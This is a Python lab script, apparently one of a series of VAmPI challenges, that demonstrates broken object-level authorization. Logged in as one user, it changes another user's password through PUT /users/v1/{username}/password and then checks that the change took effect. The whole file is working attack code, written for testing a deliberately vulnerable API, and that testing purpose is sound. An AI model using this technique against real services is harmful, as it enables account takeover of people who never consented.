#!/usr/bin/env python3
"""
vampi_challenge_05_unauthorized_password_change.py — BOLA on password change.

VAmPI's PUT /users/v1/{username}/password does not verify that the caller is
the owner. We register a THROWAWAY victim (so no seeded account is locked
out), log in as a DIFFERENT user (the attacker), and change the victim's
password. If it succeeds, we confirm by logging in as the victim with the old
vs. new password — the unauthorized password-change / BOLA pattern.

Uses a throwaway victim so re-runs are safe.
Run: python3 vampi_challenge_05_unauthorized_password_change.py [--config ...]
"""
import argparse
import os
import sys

import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import vampi_common as vc


def find_config():
    if os.path.exists("vampi_config.yaml"):
        return "vampi_config.yaml"
    return os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "vampi_config.yaml")


def main():
    ap = argparse.ArgumentParser(description="Unauthorized password change on another user")
    ap.add_argument("--config", default=find_config())
    args = ap.parse_args()

    cfg = vc.load_config(args.config)
    base = vc.base_url(cfg)
    tout = vc.timeout(cfg)
    attacker = vc.known_users(cfg)[0]

    # Throwaway victim so no seeded account is locked out.
    victim = vc.rand_username("victim")
    victim_old = "VictimOld123!"
    victim_new = "AttackerNew123!"
    r = requests.post(f"{base}/users/v1/register",
                      json={"username": victim, "password": victim_old,
                            "email": vc.rand_email(victim)},
                      headers={**vc.consumer_headers(805), "Content-Type": "application/json"}, timeout=tout)
    print(f"register throwaway victim '{victim}' -> HTTP {r.status_code}")

    # Attacker logs in.
    token = vc.login(base, attacker["username"], attacker["password"], vc.consumer_headers(805), tout)
    if not token:
        print("attacker login failed, skipping")
        return
    h = vc.auth_headers(token)

    # Baseline: attacker changes their OWN password back (harmless, valid).
    # (We skip actually changing the attacker's seeded password to avoid lockout.)
    print(f"baseline  attacker '{attacker['username']}' owns their own account (self-change not performed)")

    # BOLA: attacker changes the VICTIM's password.
    r = requests.put(f"{base}/users/v1/{victim}/password", json={"password": victim_new},
                     headers={**h, "Content-Type": "application/json"}, timeout=tout)
    print(f"bola      PUT /users/v1/{victim}/password (as {attacker['username']}) -> HTTP {r.status_code}")

    # Confirm the change actually took effect.
    old_ok = bool(vc.login(base, victim, victim_old, vc.consumer_headers(806), tout))
    new_ok = bool(vc.login(base, victim, victim_new, vc.consumer_headers(806), tout))
    print(f"  victim login w/ OLD password -> {'succeeds' if old_ok else 'fails'}")
    print(f"  victim login w/ NEW password -> {'succeeds' if new_ok else 'fails'}")

    if r.status_code == 204 and new_ok and not old_ok:
        print("[FINDING] attacker changed another user's password and it took effect (unauthorized change).")
    elif r.status_code == 204:
        print("[partial] endpoint accepted the cross-user change (HTTP 204) — verify above.")
    else:
        print("[ok] cross-user password change was rejected.")


if __name__ == "__main__":
    main()
